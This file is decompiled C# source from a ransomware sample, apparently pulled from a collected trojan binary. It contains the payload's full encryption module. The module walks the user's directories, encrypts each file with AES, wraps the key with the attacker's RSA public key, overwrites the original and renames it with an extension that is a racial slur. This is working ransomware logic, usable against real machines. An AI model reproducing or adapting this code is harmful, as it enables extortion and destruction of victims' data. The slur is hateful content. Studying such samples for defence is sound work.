// Decompiled with JetBrains decompiler
// Type: DimCo_payload.Encryption.Encryption
// Assembly: DimCo payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D97B6CD-FB99-4BFA-8324-BC32038C0234
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Encoder.gen-23bdeb9ae6a8f414c33ed8baf2de46477d0bc7f469dd543d60332a04e0b7c039.exe

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace DimCo_payload.Encryption
{
  public class Encryption
  {
    private static Random RNG = new Random();

    public int A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A()
    {
      new List<string>()
      {
        "This encryption library/wrapper was taken from github"
      };
      return 0;
    }

    public static byte[] Generate_AES_Key()
    {
      byte[] data = new byte[32];
      new RNGCryptoServiceProvider().GetBytes(data);
      return data;
    }

    public static byte[] Decrypt_File_AESRSA(Tuple<byte[], byte[]> encoded, string RSA_Private_Key)
    {
      byte[] passwordBytes = DimCo_payload.Encryption.Encryption.RSA.DecryptBytes(encoded.Item2, RSA_Private_Key);
      return DimCo_payload.Encryption.Encryption.AES.AES_Decrypt(encoded.Item1, passwordBytes);
    }

    public static string RandomString(int minlen, int maxlen)
    {
      int num = DimCo_payload.Encryption.Encryption.RNG.Next(minlen, maxlen);
      string str1 = "";
      string str2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      for (int index = 0; index < num; ++index)
        str1 += str2.ToCharArray()[DimCo_payload.Encryption.Encryption.RNG.Next(str2.Length - 1)].ToString();
      return str1;
    }

    public static string Base64Encode(byte[] plainText) => Convert.ToBase64String(plainText);

    public static void Encrypt_Dir(string dir, string RSA_Public_Key)
    {
      foreach (string enumerateFile in Directory.EnumerateFiles(dir))
      {
        try
        {
          if (!enumerateFile.EndsWith(".#01q354d98o"))
          {
            if (!enumerateFile.EndsWith(".#01q354d98o"))
            {
              File.WriteAllText(enumerateFile, JsonConvert.SerializeObject((object) DimCo_payload.Encryption.Encryption.Encrypt_File_AESRSA(File.ReadAllBytes(enumerateFile), RSA_Public_Key, DimCo_payload.Encryption.Encryption.Generate_AES_Key())));
              File.Move(enumerateFile, enumerateFile + ".nigger");
              Console.WriteLine(enumerateFile + " Encrypted.");
              global.encrypted.Add(enumerateFile + ".nigger");
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine("Couldn't encrypt " + enumerateFile + " " + ex.Message);
        }
      }
      foreach (string enumerateDirectory in Directory.EnumerateDirectories(dir))
      {
        try
        {
          if (!enumerateDirectory.ToLower().Contains("appdata"))
            DimCo_payload.Encryption.Encryption.Encrypt_Dir(enumerateDirectory, RSA_Public_Key);
        }
        catch
        {
        }
      }
    }

    public static Tuple<byte[], byte[]> Encrypt_File_AESRSA(
      byte[] File,
      string RSA_Public_Key,
      byte[] AES)
    {
      return new Tuple<byte[], byte[]>(DimCo_payload.Encryption.Encryption.AES.AES_Encrypt(File, AES), DimCo_payload.Encryption.Encryption.RSA.EncryptBytes(AES, RSA_Public_Key));
    }

    public static class RSA
    {
      private static bool _optimalAsymmetricEncryptionPadding;

      public static DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys GenerateKeys(
        int keySize)
      {
        if (keySize % 2 != 0 || keySize < 512)
          throw new Exception("Key should be multiple of two and greater than 512.");
        DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys keys = new DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys();
        using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
        {
          string xmlString1 = cryptoServiceProvider.ToXmlString(false);
          string xmlString2 = cryptoServiceProvider.ToXmlString(true);
          int keySize1 = keySize;
          string str1 = DimCo_payload.Encryption.Encryption.RSA.IncludeKeyInEncryptionString(xmlString1, keySize1);
          string str2 = DimCo_payload.Encryption.Encryption.RSA.IncludeKeyInEncryptionString(xmlString2, keySize);
          keys.PublicKey = str1;
          keys.PrivateKey = str2;
        }
        return keys;
      }

      public static string EncryptText(string text, string publicKey)
      {
        int keySize = 0;
        string xmlKey = "";
        DimCo_payload.Encryption.Encryption.RSA.GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
        return Convert.ToBase64String(DimCo_payload.Encryption.Encryption.RSA.Encrypt(Encoding.UTF8.GetBytes(text), keySize, xmlKey));
      }

      public static byte[] EncryptBytes(byte[] bytes, string publicKey)
      {
        int keySize = 0;
        string xmlKey = "";
        DimCo_payload.Encryption.Encryption.RSA.GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
        return DimCo_payload.Encryption.Encryption.RSA.Encrypt(bytes, keySize, xmlKey);
      }

      public static byte[] DecryptBytes(byte[] bytes, string publicKey)
      {
        int keySize = 0;
        string xmlKey = "";
        DimCo_payload.Encryption.Encryption.RSA.GetKeyFromEncryptionString(publicKey, out keySize, out xmlKey);
        return DimCo_payload.Encryption.Encryption.RSA.Decrypt(bytes, keySize, xmlKey);
      }

      public static byte[] Encrypt(byte[] data, int keySize, string publicKeyXml)
      {
        if (data == null || data.Length == 0)
          throw new ArgumentException("Data are empty", nameof (data));
        int maxDataLength = DimCo_payload.Encryption.Encryption.RSA.GetMaxDataLength(keySize);
        if (data.Length > maxDataLength)
          throw new ArgumentException(string.Format("Maximum data length is {0}", (object) maxDataLength), nameof (data));
        if (!DimCo_payload.Encryption.Encryption.RSA.IsKeySizeValid(keySize))
          throw new ArgumentException("Key size is not valid", nameof (keySize));
        if (string.IsNullOrEmpty(publicKeyXml))
          throw new ArgumentException("Key is null or empty", nameof (publicKeyXml));
        using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
        {
          cryptoServiceProvider.FromXmlString(publicKeyXml);
          return cryptoServiceProvider.Encrypt(data, DimCo_payload.Encryption.Encryption.RSA._optimalAsymmetricEncryptionPadding);
        }
      }

      public static string DecryptText(string text, string privateKey)
      {
        int keySize = 0;
        string xmlKey = "";
        DimCo_payload.Encryption.Encryption.RSA.GetKeyFromEncryptionString(privateKey, out keySize, out xmlKey);
        return Encoding.UTF8.GetString(DimCo_payload.Encryption.Encryption.RSA.Decrypt(Convert.FromBase64String(text), keySize, xmlKey));
      }

      public static byte[] Decrypt(byte[] data, int keySize, string publicAndPrivateKeyXml)
      {
        if (data == null || data.Length == 0)
          throw new ArgumentException("Data are empty", nameof (data));
        if (!DimCo_payload.Encryption.Encryption.RSA.IsKeySizeValid(keySize))
          throw new ArgumentException("Key size is not valid", nameof (keySize));
        if (string.IsNullOrEmpty(publicAndPrivateKeyXml))
          throw new ArgumentException("Key is null or empty", nameof (publicAndPrivateKeyXml));
        using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
        {
          cryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
          return cryptoServiceProvider.Decrypt(data, DimCo_payload.Encryption.Encryption.RSA._optimalAsymmetricEncryptionPadding);
        }
      }

      public static int GetMaxDataLength(int keySize) => DimCo_payload.Encryption.Encryption.RSA._optimalAsymmetricEncryptionPadding ? (keySize - 384) / 8 + 7 : (keySize - 384) / 8 + 37;

      public static bool IsKeySizeValid(int keySize) => keySize >= 384 && keySize <= 16384 && keySize % 8 == 0;

      private static string IncludeKeyInEncryptionString(string publicKey, int keySize) => Convert.ToBase64String(Encoding.UTF8.GetBytes(keySize.ToString() + "!" + publicKey));

      private static void GetKeyFromEncryptionString(
        string rawkey,
        out int keySize,
        out string xmlKey)
      {
        keySize = 0;
        xmlKey = "";
        if (rawkey == null || rawkey.Length <= 0)
          return;
        string str = Encoding.UTF8.GetString(Convert.FromBase64String(rawkey));
        if (!str.Contains("!"))
          return;
        string[] strArray = str.Split(new char[1]{ '!' }, 2);
        try
        {
          keySize = int.Parse(strArray[0]);
          xmlKey = strArray[1];
        }
        catch
        {
        }
      }

      [Serializable]
      public class EncryptorRSAKeys
      {
        public string PublicKey { get; set; }

        public string PrivateKey { get; set; }
      }
    }

    public class AES
    {
      public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
      {
        byte[] salt = new byte[8]
        {
          (byte) 5,
          (byte) 6,
          (byte) 2,
          (byte) 7,
          (byte) 9,
          (byte) 212,
          (byte) 34,
          (byte) 53
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
              cryptoStream.Close();
            }
            return memoryStream.ToArray();
          }
        }
      }

      public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
      {
        byte[] salt = new byte[8]
        {
          (byte) 5,
          (byte) 6,
          (byte) 2,
          (byte) 7,
          (byte) 9,
          (byte) 212,
          (byte) 34,
          (byte) 53
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
              cryptoStream.Close();
            }
            return memoryStream.ToArray();
          }
        }
      }
    }
  }
}
